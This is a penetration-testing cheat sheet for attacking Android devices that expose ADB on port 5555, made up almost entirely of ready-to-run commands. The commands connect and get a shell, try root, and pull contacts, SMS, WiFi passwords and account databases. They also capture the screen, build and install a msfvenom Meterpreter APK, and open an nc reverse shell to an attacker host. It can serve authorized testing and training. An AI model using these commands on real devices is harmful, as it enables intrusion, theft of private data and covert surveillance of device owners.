# Port 5555 - Android Debug Bridge (ADB)

## Table of Contents
- [Enumeration](#enumeration)
- [Connect and Access](#connect-and-access)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
adb connect $rhost:5555 && adb -s $rhost:5555 shell id
```

### Nmap

```shell
nmap -sV -sC -p 5555 $rhost
nmap -p 5555 --script "adb-info" $rhost
```

### Check ADB

```shell
# Try to connect
adb connect $rhost:5555

# List connected devices
adb devices
```

---

## Connect and Access

### Connect via ADB

```shell
# Connect to device
adb connect $rhost:5555

# Check connection
adb devices

# Get shell
adb -s $rhost:5555 shell
```

### Basic Commands

```shell
# Get device info
adb -s $rhost:5555 shell getprop ro.build.version.release
adb -s $rhost:5555 shell getprop ro.product.model

# List running processes
adb -s $rhost:5555 shell ps

# List installed packages
adb -s $rhost:5555 shell pm list packages
```

---

## Exploitation

### Get Root Shell

```shell
# If device is rooted
adb -s $rhost:5555 shell su

# If adbd runs as root
adb root
adb -s $rhost:5555 shell
```

### File Access

```shell
# List files
adb -s $rhost:5555 shell ls -la /sdcard/

# Download files
adb -s $rhost:5555 pull /sdcard/DCIM/Camera/ ./photos/
adb -s $rhost:5555 pull /data/data/com.app.name/databases/ ./

# Upload files
adb -s $rhost:5555 push payload.apk /sdcard/
```

### Install Malicious APK

```shell
# Generate payload with msfvenom
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o payload.apk

# Install APK
adb -s $rhost:5555 install payload.apk

# Launch app
adb -s $rhost:5555 shell am start -n com.metasploit.stage/.MainActivity
```

### Extract Sensitive Data

```shell
# Contacts database
adb -s $rhost:5555 pull /data/data/com.android.providers.contacts/databases/contacts2.db

# SMS database
adb -s $rhost:5555 pull /data/data/com.android.providers.telephony/databases/mmssms.db

# WiFi passwords
adb -s $rhost:5555 shell cat /data/misc/wifi/wpa_supplicant.conf

# Accounts
adb -s $rhost:5555 shell cat /data/system/accounts.db
```

### Screenshot and Screen Recording

```shell
# Take screenshot
adb -s $rhost:5555 shell screencap /sdcard/screen.png
adb -s $rhost:5555 pull /sdcard/screen.png

# Record screen
adb -s $rhost:5555 shell screenrecord /sdcard/recording.mp4
# Ctrl+C to stop
adb -s $rhost:5555 pull /sdcard/recording.mp4
```

### Reverse Shell

```shell
# Using nc
adb -s $rhost:5555 shell "mkfifo /data/local/tmp/f; cat /data/local/tmp/f | /system/bin/sh -i 2>&1 | nc $lhost $lport > /data/local/tmp/f"
```

---

## Port Forwarding

```shell
# Forward local port to device
adb -s $rhost:5555 forward tcp:8080 tcp:80

# Access internal service
curl http://localhost:8080
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `adb connect $rhost:5555` | Connect to device |
| `adb -s $rhost:5555 shell` | Get shell |
| `adb -s $rhost:5555 pull /path/file` | Download file |
| `adb -s $rhost:5555 push file /path/` | Upload file |
| `adb -s $rhost:5555 install app.apk` | Install APK |
